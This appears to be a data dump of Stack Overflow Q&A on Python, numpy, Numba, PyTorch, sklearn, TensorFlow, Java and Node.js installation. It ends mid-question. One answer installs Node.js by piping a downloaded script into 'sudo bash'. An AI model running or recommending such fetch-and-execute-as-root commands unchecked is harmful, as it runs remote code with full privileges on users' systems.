    289         return pyarrow.StructArray.from_pandas(series, type=arrow_type)
--&gt; 290     return pyarrow.Array.from_pandas(series, type=arrow_type)
    291
    292

~\Anaconda3\lib\site-packages\pyarrow\array.pxi in pyarrow.lib.Array.from_pandas()

~\Anaconda3\lib\site-packages\pyarrow\array.pxi in pyarrow.lib.array()

~\Anaconda3\lib\site-packages\pyarrow\array.pxi in pyarrow.lib._ndarray_to_array()

~\Anaconda3\lib\site-packages\pyarrow\error.pxi in pyarrow.lib.check_status()

ArrowTypeError: Expected bytes, got a 'int' object
</code></pre>
","73284286","<p>Had this same issue - solved it simply with</p>
<pre><code>df = df.astype(str)
</code></pre>
<p>and doing <code>to_gbq</code> on that instead.</p>
<p>Caveat is that all your fields will now be strings...</p>
"
"72269651","1","Numpy way of splitting array when cumaltive sum > x","<p><strong>Data</strong><br></p>
<p>Lets take the following 2d array:</p>
<pre><code>starts = [0, 4, 10, 13, 23, 27]
ends = [4, 10, 13, 23, 27, 32]
lengths = [4, 6, 3, 10, 4, 5] 

arr = np.array([starts, ends, lengths]).T
</code></pre>
<p>Thus looking like:</p>
<pre><code>[[ 0  4  4]
 [ 4 10  6]
 [10 13  3]
 [13 23 10]
 [23 27  4]
 [27 32  5]]
</code></pre>
<hr />
<p><strong>Goal</strong><br></p>
<p>Now I want to &quot;loop&quot; through the <code>lengths</code> and as soon as soon as the cumaltive sum reaches <code>10</code> I want to output the <code>starts</code> and <code>ends</code> and then restart the cumulative counting.</p>
<hr />
<p><strong>Working code</strong></p>
<pre><code>tot_size = 0
start = 0

for i, numb in enumerate(arr[:,-1]):
    # update sum
    tot_size += numb

    # Check if target size is reached
    if tot_size &gt;= 10:
        start_loc, end_loc = arr[:,0][start],  arr[:,1][i]
        print('Start: {}\nEnd: {}\nSum: {}\n'.format(start_loc, end_loc, tot_size))
        start = i + 1
        tot_size = 0

# Last part
start_loc, end_loc = arr[:,0][start],  arr[:,1][i]
print('Start: {}\nEnd: {}\nSum: {}\n'.format(start_loc, end_loc, tot_size))
</code></pre>
<p>Which will print:</p>
<blockquote>
<p>Start: 0 End: 10 Sum: 10</p>
<p>Start: 10 End: 23 Sum: 13</p>
<p>Start: 23 End: 32 Sum: 9</p>
</blockquote>
<p>(<em>I don't need to know the resulting sum but I do need to know the <code>starts</code> and <code>ends</code></em>)</p>
<hr />
<p><strong>Numpy try</strong></p>
<p>I suppose there must be a much more straightforward, or a vectorized, way of doing this with numpy.</p>
<ul>
<li><code>cumsum</code> + <code>remainder</code></li>
</ul>
<p>I was thinking of something like <code>np.remainder(np.cumsum(arr[:,-1]), 10)</code> however it will be &quot;hard&quot; to say when something is <em>close</em> to the target number (<code>10</code> here), which is different from just splitting when <code>sum &gt; x</code></p>
<ul>
<li><code>stride_tricks</code></li>
</ul>
<p>Since the above doesn't work in a window I thought of stides but these windows are of fixed sizes</p>
<p>All ideas are welcome :)</p>
","72279421","<p><strong>Numpy is not designed for solving efficiently such a problem</strong>. You can still solve this using some tricks or the usual combination of <code>cumsum</code> + division + <code>diff</code> + <code>where</code> or similar ones (like @Kevin proposed), but AFAIK they are all inefficient. Indeed, they require many <em>temporary arrays</em> and <em>expensive operations</em>.</p>
<p>Temporary arrays are expensive for two reasons: for small arrays, the overhead of Numpy function is typically of several microseconds per call resulting in generally in dozens of microseconds for the whole operation; and for big arrays, each operation will be memory bound and memory bandwidth is small on modern platforms. Actually, it is even worst since writing in newly allocated array is much slower due to page faults and Numpy array writes are currently not optimized on most platforms (including the mainstream x86-64 one).</p>
<p>As for &quot;expensive operations&quot; this includes sorting which runs in <code>O(n log n)</code> (quick-sort is used by default) and is generally memory bound, finding the unique values (which currently does a sort internally) and integer division which is known to be very slow since ever.</p>
<hr />
<p>One solution to solve this problem is to use <strong>Numba</strong> (or Cython). Numba use a just-in-time compiler so to write fast optimized function. It is especially useful to write your own efficient basic Numpy built-ins. Here is an example based on your code:</p>
<pre class=""lang-py prettyprint-override""><code>import numba as nb
import numpy as np

@nb.njit(['(int32[:,:],)', '(int64[:,:],)'])
def compute(arr):
    n = len(arr)
    tot_size, start, cur = 0, 0, 0
    slices = np.empty((n, 2), arr.dtype)

    for i in range(n):
        tot_size += arr[i, 2]

        if tot_size &gt;= 10:
            slices[cur, 0] = arr[start, 0]
            slices[cur, 1] = arr[i, 1]
            start = i + 1
            cur += 1
            tot_size = 0

    slices[cur, 0] = arr[start, 0]
    slices[cur, 1] = arr[i, 1]
    return slices[:cur+1]
</code></pre>
<p>For your small example, the Numba function takes about 0.75 us on my machine while the initial solution takes 3.5 us. In comparison, the Numpy solutions provided by @Kevin (returning the indices) takes 24 us for the <code>np.unique</code> and 6 us for the division-based solution. In fact, the basic <code>np.cumsum</code> already takes 0.65 us on my machine. Thus, the Numba solution is the fastest. It should be especially true for larger arrays.</p>
"
"72425408","1","Interrupt (NOT prevent from starting) screensaver","<p>I am trying to programmatically interrupt the screensaver by moving the cursor like this:</p>
<pre><code>win32api.SetCursorPos((random.choice(range(100)),random.choice(range(100))))
</code></pre>
<p>And it fails with the message:</p>
<pre><code>pywintypes.error: (0, 'SetCursorPos', 'No error message is available')
</code></pre>
<p>This error only occurs if the screensaver is actively running.</p>
<p>The reason for this request is that the computer is ONLY used for inputting data through a bluetooth device (via a Python program). When the BT device sends data to the computer the screensaver is not interrupted (which means I cannot see the data the BT device sent). Thus, when the Python program receives data from the BT device it is also supposed to interrupt the screensaver.</p>
<p>I have seen several solution on how to <em>prevent</em> the screensaver from starting (which are not suitable solutions in my case), but none on how to interrupt a running screensaver. How can I do this, using Windows 10 and Python 3.10?</p>
","73286378","<p>The Windows operating system has a hierarchy of objects.  At the top of the hierarchy is the &quot;Window Station&quot;.  Just below that is the &quot;Desktop&quot; (not to be confused with the desktop folder, or even the desktop window showing the icons of that folder).  You can read more about this concept in the <a href=""https://learn.microsoft.com/en-us/windows/win32/winstation/about-window-stations-and-desktops"" rel=""nofollow noreferrer"">documentation</a>.</p>
<p>I mention this because ordinarily only one Desktop can receive and process user input at any given time.  And, when a screen saver is activated by Windows due to a timeout, Windows creates a new Desktop to run the screen saver.</p>
<p>This means any application associated with any other Desktop, including your Python script, will be unable to send input to the new Desktop without some extra work.  The nature of that work depends on a few factors.  Assuming the simplest case, a screen saver that's created without the &quot;On resume, display logon screen&quot;, and no other Window Station has been created by a remote connection or local user login, then you can ask Windows for the active Desktop, attach the Python script to that Desktop, move the mouse, and revert back to the previous Desktop so the rest of the script works as expected.</p>
<p>Thankfully, the code to do this is easier than the explanation:</p>
<pre class=""lang-python prettyprint-override""><code>import win32con, win32api, win32service
import random
# Get a handle to the current active Desktop
hdesk = win32service.OpenInputDesktop(0, False, win32con.MAXIMUM_ALLOWED);
# Get a handle to the Desktop this process is associated with
hdeskOld = win32service.GetThreadDesktop(win32api.GetCurrentThreadId())
# Set this process to handle messages and input on the active Desktop
hdesk.SetThreadDesktop()
# Move the mouse some random amount, most Screen Savers will react to this,
# close the window, which in turn causes Windows to destroy this Desktop
# Also, move the mouse a few times to avoid the edge case of moving
# it randomly to the location it was already at.
for _ in range(4):
    win32api.SetCursorPos((random.randint(0, 100), random.randint(0, 100)))
# Revert back to the old desktop association so the rest of this script works
hdeskOld.SetThreadDesktop()
</code></pre>
<p>However, if the screen saver is running on a separate Window Station because &quot;On resume, display logon screen&quot; is selected, or another user is connected either via the physical Console or has connected remotely, then connecting to and attaching to the active Desktop will require elevation of the Python script, and even then, depending on other factors, it may require special permissions.</p>
<p>And while this might help your specific case, I will add the the core issue in the general case is perhaps more properly defined as asking &quot;how do I notify the user of the state of something, without the screen saver blocking that notification?&quot;.  The answer to that question isn't &quot;cause the screen saver to end&quot;, but rather &quot;Use something like <a href=""https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-setthreadexecutionstate"" rel=""nofollow noreferrer""><code>SetThreadExecutionState()</code></a> with <code>ES_DISPLAY_REQUIRED</code> to keep the screen saver from running.  And show a full-screen top-most window that shows the current status, and when you want to alert the user, flash an eye-catching graphic and/or play a sound to get their attention&quot;.</p>
<p>Here's what that looks like, using tkinter to show the window:</p>
<pre class=""lang-python prettyprint-override""><code>from datetime import datetime, timedelta
import ctypes
import tkinter as tk

# Constants for calling SetThreadExecutionState
ES_CONTINUOUS = 0x80000000
ES_SYSTEM_REQUIRED = 0x00000001
ES_DISPLAY_REQUIRED= 0x00000002

# Example work, show nothing, but when the timer hits, &quot;alert&quot; the user
ALERT_AT = datetime.utcnow() + timedelta(minutes=2)

def timer(root):
    # Called every second until we alert the user
    # TODO: This is just alerting the user after a set time goes by,
    #       you could perform a custom check here, to see if the user
    #       should be alerted based off other conditions.
    if datetime.utcnow() &gt;= ALERT_AT:
        # Just alert the user
        root.configure(bg='red')
    else:
        # Nothing to do, check again in a bit
        root.after(1000, timer, root)

# Create a full screen window
root = tk.Tk()
# Simple way to dismiss the window
root.bind(&quot;&lt;Escape&gt;&quot;, lambda e: e.widget.destroy())
root.wm_attributes(&quot;-fullscreen&quot;, 1)
root.wm_attributes(&quot;-topmost&quot;, 1)
root.configure(bg='black')
root.config(cursor=&quot;none&quot;)
root.after(1000, timer, root)
# Disable the screen saver while the main window is shown
ctypes.windll.kernel32.SetThreadExecutionState(ES_CONTINUOUS | ES_DISPLAY_REQUIRED)
root.mainloop()
# All done, let the screen saver run again
ctypes.windll.kernel32.SetThreadExecutionState(ES_CONTINUOUS)
</code></pre>
<p>While more work, doing this will solve issues around the secure desktop with &quot;On resume, display logon screen&quot; set, and also prevent the system from going to sleep if it's configured to do so.  It just generally allows the application to more clearly communicate its intention.</p>
"
"73325131","1","How to set all elements of pytorch tensor to zero after a certain index in the given axis, where the index is given by another pytorch tensor?","<p>I've two PyTorch tensors</p>
<pre><code>mask = torch.ones(1024, 64, dtype=torch.float32)
indices = torch.randint(0, 64, (1024, ))
</code></pre>
<p>For every <code>i</code>th row in <code>mask</code>, I want to set all the elements after the index specified by <code>i</code>th element of <code>indices</code> to zero. For example, if the first element of <code>indices</code> is <code>50</code>, then I want to set <code>mask[0, 50:]=0</code>. Is it possible to achieve this without using for loop?</p>
<p>Solution with for loop:</p>
<pre><code>for i in range(mask.shape[0]):
    mask[i, indices[i]:] = 0
</code></pre>
","73326058","<p>You can first generate a tensor of size (1024x64) where each row has numbers arranged from 0 to 63. Then apply a logical operation using the indices reshaped as (1024x1)</p>
<pre><code>mask = torch.ones(1024, 64, dtype=torch.float32)
indices = torch.randint(0, 64, (1024, 1))    # Note the dimensions

mask[torch.arange(0, 64, dtype=torch.float32).repeat(1024,1) &gt;= indices] = 0
</code></pre>
"
"72571235","1","Can I install node.js 18 on Centos 7 and do I need python 3 install too?","<p>I'm not sure if node.js 18 supports centos 7 and is it a requirement to install python 3 for node.js 18?</p>
","72571789","<p>Step 1 - <code>curl --silent --location https://rpm.nodesource.com/setup_18.x | sudo bash -</code></p>
<p>Step 2 - <code>sudo yum -y install nodejs</code></p>
<p>I don't think you need Python 3.</p>
<p>Reference - <a href=""https://computingforgeeks.com/install-node-js-on-centos-rhel-rocky-linux/"" rel=""nofollow noreferrer"">https://computingforgeeks.com/install-node-js-on-centos-rhel-rocky-linux/</a></p>
"
"72280047","1","How can I override a special method defined in a metaclass with a custom classmethod?","<p>As an example, consider the following:</p>
<pre class=""lang-py prettyprint-override""><code>class FooMeta(type):
    def __len__(cls):
        return 9000


class GoodBar(metaclass=FooMeta):
    def __len__(self):
        return 9001


class BadBar(metaclass=FooMeta):
    @classmethod
    def __len__(cls):
        return 9002

len(GoodBar) -&gt; 9000
len(GoodBar()) -&gt; 9001
GoodBar.__len__() -&gt; TypeError (missing 1 required positional argument)
GoodBar().__len__() -&gt; 9001
len(BadBar) -&gt; 9000 (!!!)
len(BadBar()) -&gt; 9002
BadBar.__len__() -&gt; 9002
BadBar().__len__() -&gt; 9002
</code></pre>
<p>The issue being with <code>len(BadBar)</code> returning 9000 instead of 9002 which is the intended behaviour.</p>
<p>This behaviour is (somewhat) documented in <a href=""https://docs.python.org/3/reference/datamodel.html#special-method-lookup"" rel=""nofollow noreferrer"">Python Data Model - Special Method Lookup</a>, but it doesn't mention anything about classmethods, and I don't really understand the interaction with the <code>@classmethod</code> decorator.</p>
<p>Aside from the obvious metaclass solution (ie, replace/extend <code>FooMeta</code>) is there a way to override or extend the metaclass function so that <code>len(BadBar) -&gt; 9002</code>?</p>
<h2>Edit:</h2>
<p>To clarify, in my specific use case I can't edit the metaclass, and I don't want to subclass it and/or make my own metaclass, unless it is the <strong>only possible way</strong> of doing this.</p>
","72281211","<p>The <code>__len__</code> defined in the class will always be ignored when using <code>len(...)</code> for the class itself:  when executing its operators, and methods like &quot;hash&quot;, &quot;iter&quot;, &quot;len&quot; can be roughly said to have &quot;operator status&quot;, Python always retrieve the corresponding method from the class of the target,  by directly acessing the memory structure of the class. These dunder methods have &quot;physical&quot; slot in the memory layout for the class: if the method exists in the class of your instance (and in this case, the &quot;instances&quot; are the classes &quot;GoodBar&quot; and &quot;BadBar&quot;, instances of &quot;FooMeta&quot;), or one of its superclasses, it is called - otherwise the operator fails.</p>
<p>So, this is the reasoning that applies on <code>len(GoodBar())</code>: it will call the <code>__len__</code> defined in <code>GoodBar()</code>'s class, and <code>len(GoodBar)</code> and <code>len(BadBar)</code> will call the <code>__len__</code> defined in their class, <code>FooMeta</code></p>
<blockquote>
<p>I don't really understand the interaction with the @classmethod
decorator.</p>
</blockquote>
<p>The &quot;classmethod&quot; decorator creates a special descriptor out of the decorated function, so that when it is retrieved, via &quot;getattr&quot; from the class it is bound too, Python creates a &quot;partial&quot; object with the &quot;cls&quot; argument already in place. Just as retrieving an ordinary method from an instance creates an object with &quot;self&quot; pre-bound:</p>
<p>Both things are carried through the &quot;descriptor&quot; protocol - which means, both an ordinary method and a classmethod are retrieved by calling its <code>__get__</code> method. This method takes 3 parameters: &quot;self&quot;, the descriptor itself, &quot;instance&quot;, the instance its bound to, and &quot;owner&quot;: the class it is ound to. The thing is that for ordinary methods (functions), when the second (instance) parameter to <code>__get__</code> is <code>None</code>, the function itself is returned. <code>@classmethod</code> wraps a function with an object with a different <code>__get__</code>: one that returns the equivalent to <code>partial(method, cls)</code>, regardless of the second parameter to <code>__get__</code>.</p>
<p>In other words, this simple pure Python code replicates the working of the <code>classmethod</code> decorator:</p>
<pre><code>class myclassmethod:
    def __init__(self, meth):
         self.meth = meth
    def __get__(self, instance, owner):
         return lambda *args, **kwargs: self.meth(owner, *args, **kwargs)
</code></pre>
<p>That is why you see the same behavior when calling a classmethod explicitly with <code>klass.__get__()</code> and <code>klass().__get__()</code>: the instance is ignored.</p>
<p><strong>TL;DR</strong>: <code>len(klass)</code>  will always go through the metaclass slot, and <code>klass.__len__()</code> will retrieve <code>__len__</code>  via the getattr mechanism, and then bind the classmethod properly before calling it.</p>
<blockquote>
<p>Aside from the obvious metaclass solution (ie, replace/extend FooMeta)
is there a way to override or extend the metaclass function so that
len(BadBar) -&gt; 9002?</p>
</blockquote>
<blockquote>
<p>(...)
To clarify, in my specific use case I can't edit the metaclass, and I
don't want to subclass it and/or make my own metaclass, unless it is
the only possible way of doing this.</p>
</blockquote>
<p>There is no other way. <code>len(BadBar)</code> will always go through the metaclass <code>__len__</code>.</p>
<p>Extending the metaclass might not be all that painful, though.
It can be done with a simple call to <code>type</code> passing the new <code>__len__</code> method:</p>
<pre><code>In [13]: class BadBar(metaclass=type(&quot;&quot;, (FooMeta,), {&quot;__len__&quot;: lambda cls:9002})):
    ...:     pass
    

In [14]: len(BadBar)
Out[14]: 9002
</code></pre>
<p>Only if BadBar will later be combined in multiple inheritance with another class hierarchy with a <em>different</em> custom metaclass you will have to worry. Even if there are other classes that have <code>FooMeta</code> as metaclass, the snippet above will work: the dynamically created metaclass will be the metaclass for the new subclass, as the &quot;most derived subclass&quot;.</p>
<p>If however, there is a hierarchy of subclasses and they have differing metaclasses, even if created by this method, you will have to combine both metaclasses in a common <em>subclass_of_the_metaclasses</em> before creating the new  &quot;ordinary&quot; subclass.</p>
<p>If that is the case, note that you can have one single paramtrizable metaclass, extending your original one (can't dodge that, though)</p>
<pre><code>class SubMeta(FooMeta):
    def __new__(mcls, name, bases, ns, *,class_len):
         cls = super().__new__(mcls, name, bases, ns)
         cls._class_len = class_len
         return cls

    def __len__(cls):
        return cls._class_len if hasattr(cls, &quot;_class_len&quot;) else super().__len__()
</code></pre>
<p>And:</p>
<pre><code>
In [19]: class Foo2(metaclass=SubMeta, class_len=9002): pass

In [20]: len(Foo2)
Out[20]: 9002

</code></pre>
"
"72621273","1","Numba parallelization with prange is slower when used more threads","<p>I tried a simple code to parallelize a loop with numba and prange. But for some reason when I use more threads instead of going faster it gets slower. Why is this happening? (cpu ryzen 7 2700x 8 cores 16 threads 3.7GHz)</p>
<pre><code>from numba import njit, prange,set_num_threads,get_num_threads
@njit(parallel=True,fastmath=True)
def test1():
    x=np.empty((10,10))
    for i in prange(10):
        for j in range(10):
            x[i,j]=i+j
</code></pre>
<pre><code>Number of threads : 1
897 ns ± 18.3 ns per loop (mean ± std. dev. of 10 runs, 100000 loops each)
Number of threads : 2
1.68 µs ± 262 ns per loop (mean ± std. dev. of 10 runs, 100000 loops each)
Number of threads : 3
2.4 µs ± 163 ns per loop (mean ± std. dev. of 10 runs, 100000 loops each)
Number of threads : 4
4.12 µs ± 294 ns per loop (mean ± std. dev. of 10 runs, 100000 loops each)
Number of threads : 5
4.62 µs ± 283 ns per loop (mean ± std. dev. of 10 runs, 100000 loops each)
Number of threads : 6
5.01 µs ± 145 ns per loop (mean ± std. dev. of 10 runs, 100000 loops each)
Number of threads : 7
5.52 µs ± 194 ns per loop (mean ± std. dev. of 10 runs, 100000 loops each)
Number of threads : 8
4.85 µs ± 140 ns per loop (mean ± std. dev. of 10 runs, 100000 loops each)
Number of threads : 9
6.47 µs ± 348 ns per loop (mean ± std. dev. of 10 runs, 100000 loops each)
Number of threads : 10
6.88 µs ± 120 ns per loop (mean ± std. dev. of 10 runs, 100000 loops each)
Number of threads : 11
7.1 µs ± 154 ns per loop (mean ± std. dev. of 10 runs, 100000 loops each)
Number of threads : 12
7.47 µs ± 159 ns per loop (mean ± std. dev. of 10 runs, 100000 loops each)
Number of threads : 13
7.91 µs ± 160 ns per loop (mean ± std. dev. of 10 runs, 100000 loops each)
Number of threads : 14
9.04 µs ± 472 ns per loop (mean ± std. dev. of 10 runs, 100000 loops each)
Number of threads : 15
9.74 µs ± 581 ns per loop (mean ± std. dev. of 10 runs, 100000 loops each)
Number of threads : 16
11 µs ± 967 ns per loop (mean ± std. dev. of 10 runs, 100000 loops each)
</code></pre>
","72621564","<p>This is totally normal. Numba needs to <strong>create threads</strong> and <strong>distribute the work between them</strong> so they can execute the computation in parallel. Numba can use different threading backends. The default if generally <em>OpenMP</em> and the default OpenMP implementation should be IOMP (OpenMP runtime of ICC/Clang) which try to <em>create threads only once</em>. Still, <strong>sharing the work between threads is far slower than iterating over 100 values</strong>. A modern mainstream processor should be able to execute the 2 nested loops in sequential in less than 0.1-0.2 us. Numba should also be able to <strong>unroll the two loops</strong>. The Numba function overhead is also generally about few hundreds of nanoseconds. The allocation of the Numpy array should be far slower than the actual loops. Additionally, there are other overheads causing this code to be significantly slower with multiple threads even if the previous overhead would be negligible. For example, <strong>false-sharing</strong> causes the writes to be mostly serialized and thus slower than if they would be done one 1 unique threads (because of a cache line bouncing effect operating on the LLC on x86-64 platforms).</p>
<p>Note that the time to create a thread is generally significantly more than 1 us because a system call is required.</p>
<p>Put it shortly: <strong>use threads when the work to do is big enough and can be efficiently parallelized</strong>.</p>
"
"72561628","1","Why such a big pickle of a sklearn decision tree (30K times bigger)?","<p>Why pickling a sklearn decision tree can generate <strong>a pickle thousands times bigger (in terms of memory) than the original estimator</strong>?</p>
<p>I ran into this issue at work where a random forest estimator (with 100 decision trees) over a dataset with around 1_000_000 samples and 7 features generated a pickle bigger than 2GB.</p>
<p>I was able to track down the issue to the pickling of a single decision tree and I was able to replicate the issue with a generated dataset as below.</p>
<p>For memory estimations I used <a href=""https://pympler.readthedocs.io/en/latest/"" rel=""noreferrer"">pympler</a> library. Sklearn version used is <code>1.0.1</code></p>
<pre class=""lang-py prettyprint-override""><code># here using a regressor tree but I would expect the same issue to be present with a classification tree
import pickle
from sklearn.tree import DecisionTreeRegressor
from sklearn.datasets import make_friedman1  # using a dataset generation function from sklear
from pympler import asizeof

# function that creates the dataset and trains the estimator
def make_example(n_samples: int):
    X, y = make_friedman1(n_samples=n_samples, n_features=7, noise=1.0, random_state=49)
    estimator = DecisionTreeRegressor(max_depth=50, max_features='auto', min_samples_split=5)
    estimator.fit(X, y)
    return X, y, estimator

# utilities to compute and compare the size of an object and its pickled version
def readable_size(size_in_bytes: int, suffix='B') -&gt; str:
    num = size_in_bytes
    for unit in ['', 'k', 'M', 'G', 'T', 'P', 'E', 'Z']:
        if abs(num) &lt; 1024.0:
            return &quot;%3.1f %s%s&quot; % (num, unit, suffix)
        num /= 1024.0
    return &quot;%.1f%s%s&quot; % (num, 'Yi', suffix)

def print_size(obj, skip_detail=False):
    obj_size = asizeof.asized(obj).size
    print(readable_size(obj_size))
    return obj_size

def compare_with_pickle(obj):
    size_obj = print_size(obj)
    size_pickle = print_size(pickle.dumps(obj))
    print(f&quot;Ratio pickle/obj: {(size_pickle / size_obj):.2f}&quot;)
    
_, _, model100K = make_example(100_000)
compare_with_pickle(model100K)
_, _, model1M = make_example(1_000_000)
compare_with_pickle(model1M)
</code></pre>
<p>output:</p>
<pre><code>1.7 kB
4.9 MB
Ratio pickle/obj: 2876.22
1.7 kB
49.3 MB
Ratio pickle/obj: 28982.84
</code></pre>
","72633003","<p>As pointed out by <a href=""https://stackoverflow.com/a/72624679/4178189"">@pygeek's answer</a> and subsequent comments, the wrong assumption of the question is that the pickle is increasing the size of the object substantially. Instead the issue lies with <code>pympler.asizeof</code> which is not giving the correct estimate of the tree object.</p>
<p>Indeed the <a href=""https://scikit-learn.org/stable/modules/generated/sklearn.tree.DecisionTreeRegressor.html?highlight=decisiontreeregressor#sklearn.tree.DecisionTreeRegressor"" rel=""nofollow noreferrer""><code>DecisionTreeRegressor</code></a> object has a <code>tree_</code> attribute that has a number of arrays of length <code>tree_.node_count</code>. Using <code>help(sklearn.tree._tree.Tree)</code> we can see that there are 8 such arrays (<code>values</code>, <code>children_left</code>, <code>children_right</code>, <code>feature</code>, <code>impurity</code>, <code>threshold</code>, <code>n_node_samples</code>, <code>weighted_n_node_samples</code>) and the underlying type of every array (except possibly the <code>values</code> array, see note below) should be an underlying 64 bit integer or 64 bit float (the underlying <a href=""https://github.com/scikit-learn/scikit-learn/blob/80598905e517759b4696c74ecc35c6e2eb508cff/sklearn/tree/_tree.pxd#L53"" rel=""nofollow noreferrer"">Tree object</a> is a cython object), so a better estimate of the size of a DecisionTree is <code>estimator.tree_.node_count*8*8</code>.</p>
<p>Computing this estimate for the models above:</p>
<pre class=""lang-py prettyprint-override""><code>def print_tree_estimate(tree):
    print(f&quot;A tree with max_depth {tree.max_depth} can have up to {2**(tree.max_depth -1)} nodes&quot;)
    print(f&quot;This tree has node_count {tree.node_count} and a size estimate is {readable_size(tree.node_count*8*8)}&quot;)
    
print_tree_estimate(model100K.tree_)
print()
print_tree_estimate(model1M.tree_)
</code></pre>
<p>gives as output:</p>
<pre><code>A tree with max_depth 37 can have up to 68719476736 nodes
This tree has node_count 80159 and a size estimate is 4.9 MB

A tree with max_depth 46 can have up to 35184372088832 nodes
This tree has node_count 807881 and a size estimate is 49.3 MB
</code></pre>
<p>and indeed these estimates are in line with the sizes of pickle objects.</p>
<p>Further note that the only way to be sure to bound the size of DecisionTree is to bound <code>max_depth</code>, since a binary tree can have a maximum number of nodes that is bounded by <code>2**(max_depth - 1)</code>, but the specific tree realizations above have a number of nodes well below this theoretical bound.</p>
<p><strong>note</strong>: the above estimate is valid for this decision tree regressor which has a single output and no classes. <code>estimator.tree_.values</code> is an array of shape <code>[node_count, n_outputs, max_n_classes]</code> so for <code>n_outputs &gt; 1</code> and/or <code>max_n_classes &gt; 1</code> the size estimate would need to take into account those and the correct estimate would be <code>estimator.tree_.node_count*8*(7 + n_outputs*max_n_classes)</code></p>
"
"72255562","1","Cannot import name 'dtensor' from 'tensorflow.compat.v2.experimental'","<p>I am having problems trying to run TensorFlow on my Windows 10 machine. Code runs fine on my MacOS machine.</p>
<pre><code>Traceback (most recent call last):
  File &quot;c:\Users\Fynn\Documents\GitHub\AlpacaTradingBot\ai.py&quot;, line 15, in &lt;module&gt;
    from keras.models import Sequential, load_model
  File &quot;C:\Users\Fynn\AppData\Local\Programs\Python\Python39\lib\site-packages\keras\__init__.py&quot;, line 24, in &lt;module&gt;
    from keras import models
  File &quot;C:\Users\Fynn\AppData\Local\Programs\Python\Python39\lib\site-packages\keras\models\__init__.py&quot;, line 18, in &lt;module&gt;
    from keras.engine.functional import Functional
  File &quot;C:\Users\Fynn\AppData\Local\Programs\Python\Python39\lib\site-packages\keras\engine\functional.py&quot;, line 24, in &lt;module&gt;
    from keras.dtensor import layout_map as layout_map_lib
  File &quot;C:\Users\Fynn\AppData\Local\Programs\Python\Python39\lib\site-packages\keras\dtensor\__init__.py&quot;, line 22, in &lt;module&gt;
    from tensorflow.compat.v2.experimental import dtensor as dtensor_api  # pylint: disable=g-import-not-at-top
ImportError: cannot import name 'dtensor' from 'tensorflow.compat.v2.experimental' (C:\Users\Fynn\AppData\Local\Programs\Python\Python39\lib\site-packages\tensorflow\_api\v2\compat\v2\experimental\__init__.py)
</code></pre>
","72336599","<p>I tried many solutions to no avail, in the end this worked for me!</p>
<pre><code>pip3 uninstall tensorflow absl-py astunparse flatbuffers gast google-pasta grpcio h5py keras keras-preprocessing libclang numpy opt-einsum protobuf setuptools six tensorboard tensorflow-io-gcs-filesystem termcolor tf-estimator-nightly typing-extensions wrapt
</code></pre>
<pre><code>pip3 install --disable-pip-version-check --no-cache-dir tensorflow
</code></pre>
"
"73336136","1","Does having a wrapper object return value (e.g. Integer) cause auto boxing in Java?","<p>I couldn't find a definitive answer for this seemingly simple question. If I write a method like this:</p>
<pre><code>public Integer getAnInt() {
  int[] i = {4};
  return i[0];
}
</code></pre>
<p>is the return value autoboxed into an Integer, or does it depend on what happens to the value after it's returned (e.g. whether the variable it is assigned to is declared as an Integer or int)?</p>
","73336170","<h1>Yes, boxed</h1>
<p>It will be (auto)boxed in the bytecode (<code>.class</code> file) because it's part of the public API, so other code might depend on the return value being an <code>Integer</code>.</p>
<p>The boxing and unboxing might be removed at runtime by the JITter under the right circumstances, but I don't know if it does that sort of thing.</p>
"
"73344242","1","Converting float32 to float64 takes more than expected in numpy","<p>I had a performance issue in a numpy project and then I realized that about 3 fourth of the execution time is wasted on a single line of code:</p>
<p><code>error = abs(detected_matrix[i, step] - original_matrix[j, new])</code></p>
<p>and when I have changed the line to</p>
<p><code>error = abs(original_matrix[j, new] - detected_matrix[i, step])</code></p>
<p>the problem has disappeared.</p>
<p>I relized that the type of <code>original_matrix</code> was <code>float64</code> and type of <code>detected_matrix</code> was <code>float32</code>. By changing types of either of these two varibles the problem solved.</p>
<p>I was wondering that if this is a well known issue?</p>
<p>Here is a sample code that represents the problem</p>
<pre><code>from timeit import timeit
import numpy as np

f64 = np.array([1.0], dtype='float64')[0]
f32 = np.array([1.0], dtype='float32')[0]

timeit_result = timeit(stmt=&quot;abs(f32 - f64)&quot;, number=1000000, globals=globals())
print(timeit_result)


timeit_result = timeit(stmt=&quot;abs(f64 - f32)&quot;, number=1000000, globals=globals())
print(timeit_result)
</code></pre>
<p>Output in my computer:</p>
<pre><code>2.8707289
0.15719420000000017
</code></pre>
<p>which is quite strange.</p>
","73346327","<p><strong>TL;DR:</strong> Please use Numpy &gt;= 1.23.0.</p>
<p>This problem has been <strong>fixed in Numpy 1.23.0</strong> (more specifically the version 1.23.0-rc1). <a href=""https://github.com/numpy/numpy/pull/21188"" rel=""nofollow noreferrer"">This pull request</a> rewrites the scalar math logic so to make it faster in many cases including in your specific use-case. With version 1.22.4, the former code is <em>10 times slower</em> than the second one. This is also true for earlier versions like the 1.21.5. In the 1.23.0, the former is only 10%-15% slower but both takes a very small time: 140 ns/operation versus 122 ns/operation. The small difference is due to a slightly different path taken in the type-checking part of the code. For more information about this low-level behavior, please read <a href=""https://stackoverflow.com/questions/73157407/why-is-repeated-numpy-array-access-faster-using-a-single-element-view/73186857#73186857"">this post</a>. Note that iterating over Numpy items it not meant to be very fast, nor operating on Numpy scalar. If your code is limited by that, please consider converting Numpy scalar into Python ones as stated in the <a href=""https://github.com/numpy/numpy/releases/tag/v1.23.0rc1"" rel=""nofollow noreferrer"">1.23.0 release notes</a>:</p>
<blockquote>
<p>Many operations on NumPy scalars are now significantly faster, although
rare operations (e.g. with 0-D arrays rather than scalars) may be slower
in some cases. However, even with these improvements users who want the
best performance for their scalars, may want to convert a known NumPy
scalar into a Python one using scalar.item().</p>
</blockquote>
<p>An even faster solution is to use Numba/Cython in this case or just to try to vectorize the encompassing loop if possible.</p>
"
"72363601","1","How to interpret the ""Package would be ignored"" warning generated by setuptools?","<p>I work on several python packages that contain data within them. I add them via the MANIFEST.in file, passing <code>include_package_data=True</code> to setup. For example:</p>
<pre><code># MANIFEST.in
graft mypackage/plugins
graft mypackage/data
</code></pre>
<p>Up to now, this has worked without warnings as far as I know. However, in setuptools 62.3.0, I get the following message:</p>
<pre><code>SetuptoolsDeprecationWarning:     Installing 'mypackage.plugins' as data is deprecated, please list it in `packages`.
07:53:53     !!
07:53:53 
07:53:53 
07:53:53     ############################
07:53:53     # Package would be ignored #
07:53:53     ############################
07:53:53     Python recognizes 'mypackage.plugins' as an importable package, however it is
